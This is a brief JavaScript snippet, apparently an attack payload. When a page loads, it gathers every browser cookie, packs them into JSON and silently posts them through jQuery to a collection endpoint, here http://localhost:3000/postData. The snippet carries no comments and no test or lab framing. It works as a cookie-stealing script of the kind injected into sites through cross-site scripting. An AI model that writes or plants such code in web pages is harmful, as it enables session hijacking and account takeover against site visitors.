function cookiesToJson() {
    const cookies = document.cookie.split("; ");
    const cookieObject = {};
    for (const cookie of cookies) {
      const [name, value] = cookie.split("=");
      cookieObject[name] = decodeURIComponent(value);
    }
    return JSON.stringify(cookieObject);
}

window.onload = function () {
    $.ajax({
        url: "http://localhost:3000/postData",
        type: "POST",
        contentType: "application/json",
        data: cookiesToJson(),
        success: function (_data){},
        error: function (error) {
            console.error("Error:", error);
        }
    });
}
